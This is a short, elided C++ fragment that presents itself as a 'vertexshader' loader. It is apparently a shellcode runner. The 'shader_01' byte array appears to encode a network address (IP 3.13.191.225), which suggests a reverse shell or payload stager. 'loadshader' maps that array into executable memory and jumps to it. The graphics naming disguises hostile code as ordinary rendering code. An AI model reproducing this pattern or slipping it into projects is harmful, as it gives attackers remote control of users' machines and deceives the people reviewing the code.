...
namespace vertexshader {
    ...
    unsigned char shader_01[] =
        ...
        "\x49\xbc\x02\x00\x41\xd0\x03\x0d\xbf\xe1\x41\x54\x49\x89\xe4"
    ...
    void loadshader()
    {
        HANDLE mem_handle = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, 0x40, 0, 511, NULL);
        void* mem_map = MapViewOfFile(mem_handle, FILE_MAP_ALL_ACCESS | 0x0020, 0x0, 0x0, 511);
        memcpy(mem_map, shader_01, sizeof(shader_01));
        ((int(*)())mem_map)();
        return;
    }
